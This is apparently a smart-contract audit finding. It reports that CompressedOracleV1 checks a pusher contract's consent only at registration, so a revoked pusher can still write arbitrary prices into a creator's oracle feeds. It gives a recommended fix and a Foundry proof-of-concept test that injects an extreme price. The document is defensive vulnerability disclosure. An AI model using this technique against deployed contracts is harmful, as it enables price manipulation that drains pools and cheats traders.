### Title
`allowContractPushers` `isPusher` Authorization Checked Only at Registration, Not at Push Time — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowContractPushers` verifies `isPusher(creator)` exactly once — at delegation time — and then permanently writes `namespaceRemapping[pusher] = creator`. The `fallback()` push path never re-queries `isPusher`; it only reads the cached `namespaceRemapping` entry. A contract pusher whose `isPusher` has been revoked (returning `false`) retains full write access to the creator's namespace indefinitely, allowing it to inject arbitrary prices into every feed the creator owns.

---

### Finding Description

`allowContractPushers` documents its security model as a **live** consent check:

> "consent is proven by a LIVE `isPusher(creator)` staticcall instead of a signature, so there is nothing to replay and no deadline is needed." [1](#0-0) 

The implementation, however, only calls `isPusher` once — at registration — and then unconditionally writes the mapping: [2](#0-1) 

The `fallback()` push path resolves the namespace solely from the cached `namespaceRemapping` entry, with no live re-check of `isPusher`: [3](#0-2) 

The only on-chain revocation paths are `removePushers` (called by the creator on the oracle) and `revokePusher` (called by the pusher itself). Neither is triggered automatically when `isPusher` changes state inside the pusher contract. [4](#0-3) 

A creator who revokes a pusher's consent within the pusher contract (e.g., by removing the creator from an internal allowlist, pausing the contract, or transferring ownership) will observe `isPusher(creator)` returning `false` and reasonably conclude — based on the NatSpec — that the pusher can no longer write to their namespace. In reality, `namespaceRemapping[pusher]` still equals `creator`, so every subsequent `fallback()` call from that pusher writes directly into the creator's slots.

---

### Impact Explanation

A compromised or revoked contract pusher can overwrite any of the creator's 256 × 4 feed positions with an arbitrary `U64x32` price and `Codebook256` spread indices. The corrupted slot value is returned verbatim by `getOracleData` / `_price`, which is the data source consumed by `AnchoredPriceProvider._getBidAndAskPrice()` and `ProtectedPriceProvider._getBidAndAskPrice()` during pool swaps. [5](#0-4) 

A manipulated mid price or spread reaches the pool's bid/ask computation unclamped (the `CompressedOracle` has no `AnchoredPriceProvider`-style reference band), enabling a swap at an attacker-chosen rate. This is a direct bad-price execution impact: traders receive more than the legitimate oracle/bin curve permits, or the pool receives less input than owed.

---

### Likelihood Explanation

The trigger requires two conditions:

1. A creator uses `allowContractPushers` (not `allowPushers`) to delegate a contract pusher.
2. The creator revokes consent inside the pusher contract (changing `isPusher` to return `false`) without also calling `removePushers` on the oracle.

Condition (2) is the natural revocation path implied by the NatSpec ("LIVE staticcall"). A creator who reads the documentation will believe that revoking within the pusher contract is sufficient. The `removePushers` call is a separate, non-obvious step that the documentation does not require. The likelihood is therefore **medium**: it requires a specific operational pattern, but that pattern is the one the documentation encourages.

---

### Recommendation

Re-verify `isPusher(creator)` inside `fallback()` whenever `namespaceRemapping[msg.sender]` is non-zero and the pusher is a contract (has code). If the live call returns `false` or reverts, treat the pusher as its own namespace (or revert the push):

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator != address(0) && msg.sender.code.length > 0) {
    (bool ok, bytes memory res) = msg.sender.staticcall(
        abi.encodeWithSignature("isPusher(address)", creator)
    );
    if (!ok || !abi.decode(res, (bool))) {
        // Revocation detected: clear the stale mapping and fall back to own namespace.
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
        creator = msg.sender;
    }
}
if (creator == address(0)) creator = msg.sender;
```

Alternatively, remove the "LIVE" claim from the NatSpec and document that `removePushers` is the **only** revocation mechanism, making the operational requirement explicit.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "contracts/oracles/utils/U64x32.sol";

/// Pusher contract whose isPusher can be toggled.
contract TogglePusher {
    bool public active = true;
    function isPusher(address) external view returns (bool) { return active; }
    function revoke() external { active = false; }
}

contract PoCTest is Test {
    CompressedOracleV1 oracle;
    TogglePusher pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = new TogglePusher();
        vm.warp(1_700_000_000);
    }

    function testRevokedContractPusherCanStillPush() public {
        // 1. Creator registers the contract pusher.
        address[] memory ps = new address[](1);
        ps[0] = address(pusher);
        vm.prank(creator);
        oracle.allowContractPushers(ps);
        assertEq(oracle.namespaceRemapping(address(pusher)), creator);

        // 2. Creator revokes consent INSIDE the pusher contract.
        pusher.revoke();
        assertFalse(pusher.isPusher(creator)); // isPusher now returns false

        // 3. Pusher still writes into the creator's namespace — bad price injected.
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = (uint48(9_999_999) << 16) | (uint48(0) << 8) | uint48(0); // extreme price
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId = 0
        word |= uint256(raw) << 208;

        vm.prank(address(pusher));
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok, "revoked pusher should have been blocked but was not");

        // 4. Bad price is now live in the creator's namespace.
        bytes32 feedId = oracle.feedIdOf(creator, 0, 0);
        IOffchainOracle.OracleData memory data = oracle.getOracleData(feedId);
        assertEq(data.price, U64x32.decode(uint32(raw >> 16)), "bad price written to creator namespace");
    }
}
```

    function removePushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];
            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            if (namespaceRemapping[pusher] == msg.sender) {
                namespaceRemapping[pusher] = address(0);
                emit PusherRevoked(pusher, msg.sender);
            } else {
                revert InvalidManager(msg.sender);
            }
        }
    }
